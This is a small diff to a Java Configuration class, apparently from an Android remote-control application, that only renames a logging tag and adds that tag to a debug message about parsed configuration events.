@@ -28,7 +28,7 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class Configuration.
  */
 public class Configuration {
-	private static final String TAG = "Conf";
+	private static final String TAG = "Configuration";
 
 	/** The status obj. */
 	private final Status statusObj;
@@ -275,7 +275,7 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			Log.d("QZ", "Configuration.java Event: " + type + " Action: " + action
+			Log.d("QZ", TAG + "Configuration.java Event: " + type + " Action: " + action
 					+ " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
